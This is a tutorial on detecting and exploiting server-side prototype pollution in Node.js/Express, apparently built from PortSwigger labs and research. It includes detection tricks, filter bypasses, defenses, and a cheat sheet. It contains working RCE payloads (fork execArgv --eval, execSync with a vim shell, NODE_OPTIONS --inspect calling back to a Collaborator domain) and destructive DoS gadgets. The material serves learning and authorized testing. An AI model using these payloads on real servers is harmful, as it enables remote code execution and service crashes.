## 1. Why server-side is different

JavaScript now runs on servers too, mostly via Node.js. The underlying bug is identical to the client-side case (an unsafe recursive merge lets a `__proto__` key reach `Object.prototype`), but exploiting it is harder for four reasons:

| Challenge | Why it's harder than client-side |
|---|---|
| **No source code** | You usually can't read the server's JavaScript, so you're guessing at sinks and gadgets blind. |
| **No DevTools** | You can't open a console on someone else's server and just check `Object.prototype.foo`. |
| **Risk of DoS** | Polluting a real property name can crash the whole Node process — for everyone, not just you. |
| **No "refresh to reset"** | In a browser, reloading the page gives you a clean prototype. On a server, your pollution sticks around for the entire lifetime of that Node process. |

So instead of "pollute and look," server-side testing is about finding **safe, reversible** ways to prove pollution happened without breaking the site.

## 2. The DoS trap

Before the safe techniques, it helps to see what goes wrong when you're not careful — these are real techniques researchers tried and rejected because they're destructive. Don't run these against anything you don't own.

### Polluting `encoding`

```js
// Node internally does something like:
if (options && options.encoding) {
  this.decoder = new StringDecoder(options.encoding);  // crashes on garbage input
}
```

Pollute `Object.prototype.encoding` with junk, and the very next stream that checks `options.encoding` throws — potentially taking the whole process down.

### Overwriting `Object.keys`

```js
Object.constructor.keys = "x";          // Object.keys is no longer a function

// Somewhere deep in a library:
var params = Object.keys(parameters).sort();   // throws: "x" is not a function
```

Technically this pollutes the `Object` constructor rather than the prototype, but it's equally destructive — it breaks anything in the app that calls `Object.keys()`.

**Lesson:** picking a gadget property that's actually *used* for real application logic is risky. The safe techniques below work precisely because they target properties that cause a **harmless, visible, reversible** change.

## 3. Detection when properties are reflected

### The core trick: `for...in` leaks inherited properties

A `for...in` loop walks both an object's own properties **and** anything it inherited from the prototype chain:

```js
const myObject = { a: 1, b: 2 };

Object.prototype.foo = 'bar';            // pollute

myObject.hasOwnProperty('foo');          // false - it's not really "on" myObject

for (const key in myObject) {
  console.log(key);
}
// a, b, foo   <- foo leaked in!
```

Same thing happens with arrays, since array indexes are just numeric property keys under the hood:

```js
const myArray = ['x', 'y'];
Object.prototype.foo = 'bar';

for (const key in myArray) { console.log(key); }
// 0, 1, foo
```

### Using this against an API

Many endpoints that update a resource respond with a JSON echo of the updated object. That's a great target:

**Request:**

```http
POST /user/update HTTP/1.1
Host: target.example
Content-Type: application/json

{
  "user": "wiener",
  "firstName": "Peter",
  "lastName": "Wiener",
  "__proto__": { "foo": "bar" }
}
```

**If vulnerable, the response echoes your injected property:**

```json
{
  "username": "wiener",
  "firstName": "Peter",
  "lastName": "Wiener",
  "foo": "bar"
}
```

That `"foo": "bar"` showing up — on a key that was never part of the `user` object — is proof you polluted `Object.prototype`. Occasionally the app even renders these properties into HTML, so the pollution shows up directly in your browser.

### Where to look for gadgets next

Once you've confirmed pollution is possible, focus on anything that **updates a user's own data**. These flows often merge your JSON straight into the internal user object. If you can sneak in extra properties, you may be able to escalate privileges (e.g. adding an `isAdmin` field the app later checks).

## 4. Detection when nothing is reflected

Most of the time your injected property won't show up anywhere in the response. Since you can't open a console on their server either, you need another way to prove pollution worked: **pollute a property that controls server behavior you can observe from outside**, then toggle it on and off.

### 4.1 Status code override

Frameworks like Express let error-handling code set a custom HTTP status. Node's `http-errors` module does roughly this:

```js
function createError() {
  // ...
  if (type === 'object' && arg instanceof Error) {
    err = arg;
    status = err.status || err.statusCode || status;   // <- reads inherited "status" too
  }
  // ...
  if (typeof status !== 'number' ||
      (!statuses.message[status] && (status < 400 || status >= 600))) {
    status = 500;
  }
}
```

If the app never explicitly sets `status` on its error object, this falls through to the prototype.

**Steps:**

1. Trigger an error normally and note the default status code (e.g. a generic `500`).
2. Pollute the prototype with an obscure status code in the `400`–`599` range:
   ```json
   { "__proto__": { "status": 509 } }
   ```
3. Trigger the same error again. If the response now returns `509`, pollution worked.

> Stay in the `400`–`599` range — anything outside it gets forced back to `500` by Node, so you'd learn nothing.

### 4.2 JSON spaces override

Express has a `json spaces` setting that controls indentation of JSON responses. It's almost always left at its default.

```json
{ "__proto__": { "json spaces": 10 } }
```

Send any request that returns JSON, switch Burp's message viewer to the **`Raw`** tab (a pretty-printed view hides the difference), and check whether the indentation changed. This technique is especially nice because:

- It doesn't need any specific property to be reflected — just *any* JSON response.
- It's fully reversible: set it back to the normal value (or `0`) to undo it.

(Note: this was patched in Express 4.17.4+, but plenty of older deployments are still out there.)

#### Worked example from a real lab run

**1. Baseline — no pollution, compact JSON:**

```json
{"username":"wiener","city":"Wienerville","country":"UK"}
```

No whitespace at all — that's the default `json spaces` setting (`0`).

**2. Pollute `json spaces` via `__proto__`:**

Request body:

```json
{"city":"Wienerville","country":"UK",
"__proto__": { "json spaces": 10 }}
```

Response — now indented with 10 spaces per level, and the polluted property itself leaked in (must view in **`RAW`** tab):

```json
{
          "username": "wiener",
          "city": "Wienerville",
          "country": "UK",
          "json spaces": 10
}
```

**3. Same thing via `constructor.prototype`, to bypass a `__proto__` filter:**

```json
{"city":"Wienerville","country":"UK",
"constructor": { "prototype": { "json spaces": 10 } }}
```

Same polluted, indented response comes back — confirming the filter bypass works too.

### 4.3 Charset override (UTF-7 trick)

Express middleware like `body-parser` reads a charset from the request's `Content-Type` header, falling back to an empty string if none is given:

```js
function getCharset(req) {
  try {
    return (contentType.parse(req).parameters.charset || '').toLowerCase();
  } catch (e) {
    return undefined;
  }
}

read(req, res, next, parse, debug, {
  encoding: charset,   // <- comes from getCharset(), which can be polluted
  // ...
});
```

**Steps:**

1. Put a UTF-7-encoded string in a property you know gets reflected. `foo` encoded as UTF-7 is `+AGYAbwBv-`:
   ```json
   { "sessionId": "0123456789", "username": "wiener", "role": "+AGYAbwBv-" }
   ```
2. Send it. By default the server doesn't speak UTF-7, so the response still shows the raw encoded string.
3. Pollute the prototype to force a UTF-7 charset:
   ```json
   {
     "sessionId": "0123456789",
     "username": "wiener",
     "role": "default",
     "__proto__": { "content-type": "application/json; charset=utf-7" }
   }
   ```
4. Repeat step 1. If pollution worked, the server now decodes it:
   ```json
   { "sessionId": "0123456789", "username": "wiener", "role": "foo" }
   ```

Interestingly, this even overrides an explicit `charset=utf-8` in your real request header. That's because of a quirk in Node's header-handling code, which only copies a header value across if the destination doesn't already have that property — and it doesn't distinguish "doesn't have it" from "inherited it from a polluted prototype":

```js
function _addHeaderLine(field, value, dest) {
  // ...
  } else if (dest[field] === undefined) {
    dest[field] = value;   // only runs if NOT already present — including inherited!
  }
}
```

Since the polluted `content-type` property is "present" (inherited), the real header value from your request never gets copied in, and the polluted one wins.

## 5. Scanning automatically

Doing all of this by hand across a whole site is slow. PortSwigger publishes a **Server-Side Prototype Pollution Scanner** extension for Burp Suite that automates it.

**Typical workflow:**

1. Install the extension from the BApp Store.
2. Crawl the target with Burp's browser so requests land in the proxy history.
3. Go to **Proxy > HTTP history**, filter to in-scope items, select them all.
4. Right-click → **Extensions > Server-Side Prototype Pollution Scanner**, choose a scanning technique (or **Full scan** to run everything).
5. Review findings in the **Dashboard**/**Target** tabs (Pro) or the extension's **Output** tab (Community Edition).

## 6. Bypassing filters

The same bypasses used client-side work here too:

```
# 1. Obfuscate the blocked keyword so a naive filter misses it
?__pro__proto__to__.gadget=payload

# 2. Reach the prototype via "constructor" instead of "__proto__"
?constructor[prototype][gadget]=payload
```

```json
{ "constructor": { "prototype": { "gadget": "payload" } } }
```

Node also lets admins disable `__proto__` entirely from the command line:

```
--disable-proto=delete    # removes __proto__ altogether
--disable-proto=throw     # throws if __proto__ is accessed
```

Even this isn't a full fix — the `constructor.prototype` route above still works, because it never touches the string `__proto__` at all.

## 7. From pollution to remote code execution

Client-side pollution usually tops out at DOM XSS. Server-side pollution can go all the way to **remote code execution (RCE)**, because Node exposes functions that spawn system processes — most of them in the `child_process` module.

### 7.1 Finding the vulnerable request out-of-band

The request that lets you pollute the prototype and the request that later *uses* the dangerous sink are often different, and may happen asynchronously. The reliable way to find this is to make the pollution itself trigger a network callback (an out-of-band interaction, e.g. via Burp Collaborator).

Node reads a `NODE_OPTIONS` environment variable at process startup. Since this is just a property on the `env` object, it's pollutable if undefined. Combine it with the `shell` option some `child_process` functions accept:

```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
  }
}
```

Whenever the app next spawns a Node child process, it does so with your `--inspect` flag, which makes Node try to open a debug connection — causing a DNS lookup to your Collaborator domain. That callback confirms: (a) pollution worked, and (b) a `child_process` call is reachable.

> The escaped double quotes (`\"\"`) inside the hostname aren't required for the technique to work — they just help the payload slip past WAFs or other tools that scan for recognizable hostnames in plaintext.

### 7.2 RCE via `child_process.fork()`

`fork()` spawns a new Node subprocess and accepts an options object with an `execArgv` property — command-line arguments for the new process. If the app doesn't set it, it's pollutable.

The interesting flag here is `--eval`, which runs arbitrary JavaScript in the new process:

```json
{
  "__proto__": {
    "execArgv": ["--eval=require('child_process').execSync('whoami')"]
  }
}
```

This effectively chains a **JavaScript injection** (via `--eval`) into a **command injection** (via whatever Node code you choose to run), giving full RCE.

### 7.3 RCE via `child_process.execSync()`

Sometimes the app already calls `execSync()` on its own, to run some system command. `execSync()` also takes an options object, and two of its properties are commonly left undefined:

- **`input`** — a string piped to the child process's `stdin`.
- **`shell`** — which shell binary to run the command in (defaults to the system shell).

Pollute both together to redirect execution to a shell and command of your choosing:

```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! whoami\n"
  }
}
```

**Why Vim?** It isn't a shell, but it satisfies three odd requirements at once:

1. `shell` can only be an executable name — no extra arguments.
2. Node always runs the shell with `-c`. Most real shells interpret `-c "command"` as "run this command," but passing `-c` to `node` itself just triggers a syntax check — so you can't easily use Node as your own shell.
3. The `input` payload arrives via `stdin`, so whatever you pick as a "shell" must accept piped input.

Vim (and the related `ex`) happens to tick all three boxes: it's a valid executable name, it reads from `stdin`, and `:! command` runs a shell command from inside it. The trailing `\n` simulates pressing Enter, since Vim is normally interactive.

**Tooling quirks:** some tools you might want to run this way don't read `stdin` by default either.

- With `curl`, use `-d @-` to read the POST body from `stdin`.
- With `xargs`, you can convert piped `stdin` into command-line arguments for another tool.

## 8. Research extras: more detection tricks

A few more non-destructive detection techniques from the PortSwigger Research write-up, useful when the ones above don't apply:

### Exposed headers (CORS)

If the `cors` module is installed, its `exposedHeaders` option controls the `Access-Control-Expose-Headers` response header:

```json
{ "__proto__": { "exposedHeaders": ["x-pp-test"] } }
```

If `x-pp-test` starts appearing in that header on every response, pollution worked — and you didn't need any specific parameter to be reflected.

### OPTIONS method listing

Express routers decide whether to advertise the `HEAD` method in an `OPTIONS` response partly based on a `head` property:

```json
{ "__proto__": { "head": true } }
```

Send an `OPTIONS` request before and after — if `HEAD` disappears from the allowed-methods list, pollution worked.

### JSON reflection without guessing a real property

Send two keys side by side, one with a harmless string value:

```json
{ "__proto__x": "control", "__proto__": "novalue" }
```

If `__proto__x` is reflected back but `__proto__` is silently swallowed (because it was interpreted as the real prototype accessor rather than a plain key), that asymmetry is itself a signal of pollution-prone JSON handling.

### Generic "no reflection needed" trick

This exploits how assigning a prototype works in JavaScript — assigning a primitive is a silent no-op, but assigning an object throws:

```js
({}).__proto__.__proto__ = {};    // throws a TypeError
({}).__proto__.__proto__ = "x";   // silently does nothing
```

If an app's merge logic lets you control a deeply nested path like this, triggering the "throws vs. doesn't throw" difference (e.g. via a 500 error appearing or not) can confirm pollution without needing anything to be reflected at all.

## 9. Defenses

Ways to prevent server-side prototype pollution, based on the Research page's recommendations:

### Use `Map` / `Set` instead of plain objects

```js
// Instead of a plain object for lookups:
const options = new Map();
options.set('foo', 'bar');
options.get('foo');          // 'bar', and Map never inherits from Object.prototype

const allowedTags = new Set();
allowedTags.add('b');
allowedTags.has('b');        // true
```

### Disable `__proto__` (defense-in-depth, not a full fix)

```
node --disable-proto=delete app.js
```

Still bypassable via `constructor.prototype`, so pair it with other defenses.

### Give objects a `null` prototype

```js
const safeObject = Object.create(null);   // inherits nothing at all

// Or, as a last resort, in an object literal:
const config = { __proto__: null, theme: "dark" };
```

### General good practice (not from the sources, standard advice)

```js
// Reject dangerous keys outright during any merge/parse step
const BLOCKED_KEYS = new Set(["__proto__", "constructor", "prototype"]);

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (BLOCKED_KEYS.has(key)) continue;
    // ...merge safely
  }
  return target;
}
```

## 10. Cheat sheet

### Safe, non-destructive detection payloads

```json
// Reflected property check
{ "__proto__": { "foo": "bar" } }

// Status code override (pick an obscure 4xx/5xx)
{ "__proto__": { "status": 509 } }

// JSON spacing override
{ "__proto__": { "json spaces": 10 } }

// Charset / UTF-7 override
{ "__proto__": { "content-type": "application/json; charset=utf-7" } }

// CORS exposed headers
{ "__proto__": { "exposedHeaders": ["x-pp-test"] } }

// OPTIONS method toggle
{ "__proto__": { "head": true } }
```

### Filter bypasses

```
?__pro__proto__to__.gadget=payload
?constructor[prototype][gadget]=payload
```

### RCE payloads (authorized testing only)

```json
// Out-of-band confirmation via Collaborator
{ "__proto__": { "shell": "node", "NODE_OPTIONS": "--inspect=YOUR-ID.oastify.com\"\".oastify\"\".com" } }

// fork() + --eval
{ "__proto__": { "execArgv": ["--eval=require('child_process').execSync('id')"] } }

// execSync() via vim
{ "__proto__": { "shell": "vim", "input": ":! id\n" } }
```

### Summary table

| Goal | Technique | Needs reflection? | Destructive? |
|---|---|---|---|
| Confirm pollution | `for...in` leak via API echo | Yes | No |
| Confirm pollution | Status code override | No | No (reversible) |
| Confirm pollution | JSON spaces override | No | No (reversible) |
| Confirm pollution | Charset/UTF-7 override | Needs one reflected field | No (reversible) |
| Confirm pollution | Exposed headers (CORS) | No | No |
| Confirm pollution | OPTIONS method toggle | No | No |
| Confirm pollution | Generic throw/no-throw check | No | No |
| Find async sinks | `NODE_OPTIONS` + Collaborator | No | No |
| Exploit | `fork()` + `execArgv` `--eval` | — | Yes (gives RCE) |
| Exploit | `execSync()` + `shell`/`input` | — | Yes (gives RCE) |

**Golden rule:** always prefer a detection technique that you can toggle on and off and that doesn't touch a property real application logic depends on. Save the destructive gadgets for the exploit step, once you already know the target is vulnerable and you're authorized to go further.
